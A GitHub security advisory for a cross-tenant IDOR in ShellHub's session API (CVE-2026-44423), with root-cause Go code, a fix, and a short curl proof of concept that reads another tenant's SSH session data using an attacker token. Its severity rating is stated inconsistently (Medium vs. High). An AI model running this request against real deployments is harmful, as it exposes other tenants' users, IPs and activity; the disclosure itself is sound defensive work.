# [M] ShellHub has cross-tenant IDOR in `GET /api/sessions/:uid` that discloses SSH session data

## Summary
Severity: Medium
Advisory: GHSA-9w9c-9w8m-w89q
CVE: CVE-2026-44423
CWE: CWE-639
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-9w9c-9w8m-w89q
Type: github-advisory

## Affected
- Go: `github.com/shellhub-io/shellhub` — affected >=0 <0.24.2

## Details
## Summary
`GET /api/sessions/:uid` returns the full session object for any authenticated caller, without scoping by the caller's tenant. An authenticated user can read session records (SSH username, device UID, remote IP, terminal type, authenticated flag, timestamps) belonging to any other namespace.

## Severity
**CVSS 3.1: 7.5 (High)** 
CWE-639

## Affected versions
ShellHub Community v0.24.1 (by code inspection — same vulnerable pattern as `GetDevice`). Not plant-reproducible without an active SSH session, but the flaw is structurally identical and confirmed via static analysis.

## Root cause
`api/services/session.go:37-44` — `GetSession` resolves the session by UID without any tenant filter:

  ```go
  func (s *service) GetSession(ctx context.Context, uid models.UID) (*models.Session, error) {
      session, err := s.store.SessionResolve(ctx, store.SessionUIDResolver, string(uid))
      // ⚠️ missing: s.store.Options().InNamespace(tenant)
      ...
  }
  ```

The `Authorize` middleware only verifies presence of a tenant in the context, not ownership of the requested session.

## Proof of concept

Pre-requisite: attacker has any valid user account and has obtained a session UID from the victim tenant (UIDs may leak via logs, shared session recordings, UI URLs, or through the device IDOR in the companion advisory since sessions reference devices by UID).

  ```bash
  ATTACKER_TOKEN=$(curl -s -X POST http://target/api/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"attacker","password":"..."}' | jq -r .token)

  # Attempt cross-tenant read
  curl -i "http://target/api/sessions/<victim-session-uid>" \
    -H "Authorization: Bearer $ATTACKER_TOKEN"
  # Expected (fixed):   HTTP 403/404
  # Observed (v0.24.1): HTTP 200 + full session JSON
  ```

## Impact
  - Cross-tenant disclosure of SSH session data: target username, device UID, remote IP, authenticated status, session type, terminal, position (geolocation), started_at / last_seen timestamps.
  - Enables reconnaissance of other tenants' active users and systems; combined with session recording features, can enable deeper recon.

## Suggested fix
`api/services/session.go` — apply `InNamespace` in `GetSession`:

  ```go
  func (s *service) GetSession(ctx context.Context, uid models.UID) (*models.Session, error) {
      tenant := gateway.TenantFromContext(ctx)
      opts := []store.QueryOption{}
      if tenant != nil {
          opts = append(opts, s.store.Options().InNamespace(tenant.ID))
      }
      session, err := s.store.SessionResolve(ctx, store.SessionUIDResolver, string(uid), opts...)
      ...
  }
  ```

## References
- https://github.com/shellhub-io/shellhub/security/advisories/GHSA-9w9c-9w8m-w89q
- https://nvd.nist.gov/vuln/detail/CVE-2026-44423
- https://github.com/shellhub-io/shellhub
